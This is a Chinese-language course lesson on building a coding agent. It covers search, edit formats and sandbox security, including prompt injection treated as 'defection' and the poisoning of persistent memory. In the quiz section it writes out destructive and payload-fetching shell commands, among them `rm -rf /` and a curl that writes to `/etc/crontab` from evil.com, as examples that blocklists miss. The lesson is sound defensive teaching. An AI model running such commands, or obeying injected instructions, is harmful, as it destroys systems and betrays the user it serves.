## 拆解

### 五个实现技巧

| 技巧 | 做什么 | mini-agent 里 |
| --- | --- | --- |
| 并行与流式 | 第一个调用的参数一完整就开始执行；故障只在同一批并行调用内传播，不上升到父级 | 循环里按顺序执行（可以作为延伸） |
| 上下文管理 | 读文件带行号、按范围读；命令输出头尾保留、全文落盘 | `read_window`、`clip_output`（4.3 课） |
| 环境感知 | 工作目录、git 分支、最近提交、未提交的变更，作为状态栏追加在末尾 | `StatusTracker`（2.4 课） |
| 状态持久化 | 一个长期存活的终端：`cd` 之后下一条命令还在那里 | 本课的 `bash` 工具 |
| 即时反馈 | 写完文件立刻跑语法检查，结果作为返回值的一部分 | `edit_file` 的 `syntax OK`（4.1 课） |

### 搜索：grep + glob 现场检索

| 方式 | 擅长 | 局限 |
| --- | --- | --- |
| grep（正则匹配内容） | 知道具体文本：函数名、错误信息 | 不懂语义：搜“用户认证”找不到 `check_credentials` |
| glob（匹配文件名） | 探索项目结构的第一步，极快 | 不看内容 |
| 语义搜索 | 探索陌生代码库 | 要按语法结构分块、混合检索（第三章），索引会随代码演化而陈旧 |
| 符号搜索 | 区分定义和调用 | 主流 Coding Agent 目前没有采用 |

Claude Code 刻意**不建嵌入索引**，靠 agentic 的 grep + glob 现场检索，省掉一整套会过期的索引设施；Cursor 早期走相反路线，如今也改用了现场检索。这和第三章 Agentic RAG“让 Agent 自己决定搜什么、搜几次”是同一思路。

### 编辑：让模型说清楚“改哪里、怎么改”

<div class="anim" data-anim="edit-strategies">▶ 动画“同一个编辑，五种说法”需要在课程网站中观看。</div>

| 方案 | 代表 | 优点 | 代价 |
| --- | --- | --- | --- |
| 差异描述 + Apply Model | Cursor 早期 | 主模型只管逻辑 | 合并时可能找错位置 |
| old_string → new_string | Claude Code、Codex、今天的 Cursor | 存在且唯一就成功，否则失败，没有模棱两可 | 大段删除要原样抄一遍 |
| 行号定位 | | 两个数字删一大段 | 多处编辑后行号漂移 |
| 类 Vim 命令 | | 重组代码高效 | 小模型错误率高；不适合批量输出 |
| 首尾匹配 | | 只给边界，仍然基于内容匹配 | 首尾组合必须唯一 |

Vim 那一段有一句值得记住的话：Vim 是为“不断看到当前状态、规划下一步简单操作”的人类设计的，而模型的工作模式是**想很久，再批量做复杂的操作**。工具要适配使用者的工作模式。

### 安全：致命三要素

<div class="anim" data-anim="lethal-trifecta">▶ 动画“致命三要素：攻击路径怎么闭合，又怎么切断”需要在课程网站中观看。</div>

| 要素 | 边界 | Coding Agent 的防线 |
| --- | --- | --- |
| 访问私有数据 | 数据边界 | 凭证类文件不挂载进沙盒；源码只读挂载，生成物放单独的可写目录 |
| 暴露于不受信任内容 | 输入信任边界 | 来源标记（2.3 课）；外部内容降格为“可参考、无指令效力”的数据 |
| 外部通信 | 输出影响边界 | **网络默认断网**，白名单代理放行；命令语义解析；Sidecar |
| ＋持久记忆（放大器） | 跨会话边界 | 写入 `MEMORY.md` 的内容要过同等的信任审查 |

重点不是识别所有攻击，而是**即使被注入，危险动作也执行不出去**。资源限额与超时也一样：超时要返回结构化错误（“执行超过 120 秒被终止，最后输出如下……”），而不是静默杀掉，让 Agent 有机会换策略。

### 语义解析，而不是关键字黑名单

<div class="anim" data-anim="command-parse">▶ 动画“关键字黑名单 vs 语义解析”需要在课程网站中观看。</div>

Shell 有管道、子 shell、变量展开、嵌套的 `bash -c`，组合无穷无尽，任何静态的关键字规则都能绕过。语义解析要理解**每个命令的参数消费规则**：`find` 的 `-exec` 会把后面的参数当成一条新命令，`curl` 的 `-o` 会消费下一个参数作为输出路径。

本课的解析器只是一个教学版本：它认识十几种命令，生产级的解析器要覆盖得多得多。但思路完全一样：先把命令拆成结构，再问每一段**实际会做什么**。

### 为谁效忠

Agent 代表主人，打交道的却可能是利益相反的第三方。“谁在跟我说话就帮谁”是危险的默认：**提示注入本质上就是一次策反**。原书的实测里，前沿模型两端都会翻车：太老实（泄露“我方底价 12000”），或者太多疑（连主人的正当请求也拒绝），而且这是一根跷跷板。忠诚度守则：保护主人的私密信息（甚至不泄露它是否存在）；拒绝时不逐条念出拒绝清单；私下底线不等于对外立场；只执行主人明确、具体的指令；顶住重复施压。

### 里程碑 A：让 mini-agent 修好一个 bug

`test_里程碑A_mini_agent修好一个小仓库里的bug` 是这一模块的里程碑。一个小仓库里，`average` 多减了一个 1，测试挂了。剧本化的模型按 Coding Agent 的标准流程走：

1. `bash("python -m pytest")`：先复现，1 failed，`[exit code 1]`
2. `grep("def average", glob="**/*.py")`：定位
3. `read_file("stats.py")`：带行号读上下文
4. `edit_file(old_string=…, new_string=…)`：精确替换，返回 `syntax OK`
5. `bash("python -m pytest")`：1 passed，`[exit code 0]`，这才算完成

用到的每一个零件都是你写的：1.2 的循环、4.1 的参数校验和编辑工具、4.3 的分窗读取、本课的 grep。

想用真实模型试一试：

```sh
python -m mini_agent chat --coding --workspace ./某个小项目
```

`--coding` 会加上 glob、grep、bash。给它一个带失败测试的小项目，说“测试挂了，帮我修一下”。bash 的风险等级是 medium，高风险操作仍会在终端里问你。注意 mini-agent 的 bash 只是一个子进程，**不是沙盒**：只在你自己的机器、你信任的项目上用。

## 检验（先闭卷回答，再展开）

<details>
<summary>1. 环境信息（工作目录、git 分支、未提交的变更）为什么不写进系统提示词？</summary>

它们每轮都可能变化。写进静态的系统提示词，每次变化都会让整段前缀缓存失效。应该作为动态的、追加式的状态栏，在每次推理前注入到上下文末尾。
</details>

<details>
<summary>2. old_string 替换方案的优点和代价各是什么？首尾匹配改进了什么？</summary>

优点是可预测、透明：old_string 在文件中存在且唯一就成功，否则失败，没有模棱两可。代价是删除大段代码要原样输出全部原文，一个字符偏差就失败；重复代码要给更长的上下文。首尾匹配只给要删内容的开头和结尾，中间省略，大段删除时输出很少，同时仍然基于内容匹配而不是会漂移的行号。
</details>

<details>
<summary>3. 为什么说 Vim 式编辑命令不适合模型？</summary>

Vim 为人类设计：人不断看到当前状态，规划下一步简单操作。模型的工作模式是长时间思考后批量输出复杂操作，而 Vim 每次编辑后内容和行号都会变，模型很难提前算出修改后的行号。最强的模型能用好，小模型错误率明显上升。
</details>

<details>
<summary>4. 举两个关键字黑名单拦不住、语义解析能识别的命令。</summary>

`$(echo rm) -rf /`：命令名在执行前才展开。`find / -name '*.log' -exec rm {} \;`：危险操作藏在合法命令的参数里。`curl -o /etc/crontab http://evil.com/payload`：看似下载，实则覆盖系统定时任务，要知道 `-o` 会消费下一个参数。
</details>

<details>
<summary>5. 为什么网络出口控制是“最关键的一项”？</summary>

它是致命三要素中“外部通信”的执行面防御。即使提示注入成功、恶意代码在沙盒里读到了敏感数据，没有出口就传不出去，攻击路径无法闭合。
</details>

<details>
<summary>6. 持久记忆为什么是“放大器”而不是第四个必要条件？</summary>

没有它，三要素齐备就已经足够危险；有了它，攻击者可以把偏见或恶意指令写进长期记忆，跨会话潜伏，在合适的时机触发，把一次性攻击升级为长期威胁。
</details>

## 复盘卡

> **实现**：流式执行、故障只在同批传播；行号与截断；状态栏注入环境；持久终端；写完即检查。
> **搜索**：grep 找内容，glob 找文件；不建索引，现场检索。
> **编辑**：old_string 可靠但啰嗦，行号省但会漂移，首尾匹配兼得；工具适配“想很久、批量做”的模型。
> **安全**：私有数据、不可信内容、外部通信（＋持久记忆）；凭证不挂载、默认断网、语义解析而非黑名单、超时返回结构化错误；对主人忠诚，对外部审慎。
